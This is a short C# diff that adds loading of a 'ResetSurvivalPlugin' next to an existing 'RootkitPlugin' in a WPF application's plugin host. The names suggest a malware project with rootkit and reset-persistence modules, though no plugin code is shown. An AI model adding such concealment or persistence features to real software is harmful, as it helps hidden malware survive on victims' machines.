@@ -84,6 +84,9 @@ namespace WpfApp.Plugins
             if (!_host.LoadedPlugins.ContainsKey("rootkit"))
                 await _host.LoadPlugin(new RootkitPlugin());
 
+            if (!_host.LoadedPlugins.ContainsKey("resetsurvival"))
+                await _host.LoadPlugin(new ResetSurvivalPlugin());
+
             await LoadExternalPlugins();
         }
 
